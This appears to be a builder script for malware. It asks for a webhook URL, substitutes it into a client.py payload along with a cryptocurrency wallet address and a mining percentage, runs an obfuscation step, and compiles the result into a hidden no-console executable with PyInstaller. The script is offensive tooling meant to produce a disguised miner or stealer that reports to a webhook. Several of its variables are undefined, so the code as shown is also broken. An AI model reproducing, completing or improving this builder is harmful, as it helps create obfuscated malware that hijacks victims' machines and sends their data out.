import uuid
import base64
import hashlib
import os 
import pyImpossibleObf

key ="loooood"
webhook = input("Webhook : ")
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("webhook667", webhook).replace("42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq", trxaddress ).replace("miningpercentEKIP", str(miningpercent))
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

os.system(val +' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
